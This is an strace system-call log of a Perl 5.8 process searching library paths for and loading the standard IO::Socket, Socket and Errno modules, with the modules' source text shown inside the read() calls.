10104 20:03:03.425024 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.425044 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.425058 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.425086 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.425099 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.425112 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.425124 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.425138 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.425151 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
10104 20:03:03.425173 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
10104 20:03:03.425188 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa444b8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.425200 _llseek(6, 0, [0], SEEK_CUR) = 0
10104 20:03:03.425218 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
10104 20:03:03.425598 stat64("/etc/perl/Socket.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.425615 stat64("/etc/perl/Socket.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.425629 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.425642 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.425656 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.425669 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.425683 stat64("/usr/lib/perl5/Socket.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.425695 stat64("/usr/lib/perl5/Socket.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.425709 stat64("/usr/share/perl5/Socket.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.425721 stat64("/usr/share/perl5/Socket.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.425735 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.425747 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
10102 20:03:03.425777 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
10104 20:03:03.425788 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.425803 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.425814 _llseek(8, 0, [0], SEEK_CUR) = 0
10102 20:03:03.425825 <... rt_sigprocmask resumed> NULL, 8) = 0
10104 20:03:03.425839 read(8,  <unfinished ...>
10102 20:03:03.425857 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
10104 20:03:03.425868 <... read resumed> "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
10104 20:03:03.426314 brk(0x8239000 <unfinished ...>
10102 20:03:03.426324 <... rt_sigprocmask resumed> [], 8) = 0
10102 20:03:03.426335 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10102 20:03:03.426347 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10102 20:03:03.426360 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
10102 20:03:03.426374 waitpid(-1,  <unfinished ...>
10104 20:03:03.527259 <... brk resumed> ) = 0x8239000
10104 20:03:03.557244 read(8, "", 4096) = 0
10104 20:03:03.557273 close(8)          = 0
10104 20:03:03.557373 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10104 20:03:03.557403 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10104 20:03:03.557486 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
10104 20:03:03.557517 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
10104 20:03:03.557610 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10104 20:03:03.557629 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d9b000
10104 20:03:03.557644 mmap2(0xb7da0000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7da0000
10104 20:03:03.557663 close(8)          = 0
10104 20:03:03.558290 brk(0x825a000)    = 0x825a000
10104 20:03:03.558615 stat64("/etc/perl/Errno.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.558635 stat64("/etc/perl/Errno.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.558650 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.558663 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.558678 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.558691 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.558706 stat64("/usr/lib/perl5/Errno.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.558718 stat64("/usr/lib/perl5/Errno.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.558732 stat64("/usr/share/perl5/Errno.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.558744 stat64("/usr/share/perl5/Errno.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.558758 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.558771 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
10104 20:03:03.558794 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.558809 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.558822 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.558843 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
10104 20:03:03.559614 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
10104 20:03:03.560086 _llseek(8, 5966, [5966], SEEK_SET) = 0
10104 20:03:03.560104 _llseek(8, 0, [5966], SEEK_CUR) = 0
10104 20:03:03.560115 close(8)          = 0
10104 20:03:03.560518 brk(0x827b000)    = 0x827b000
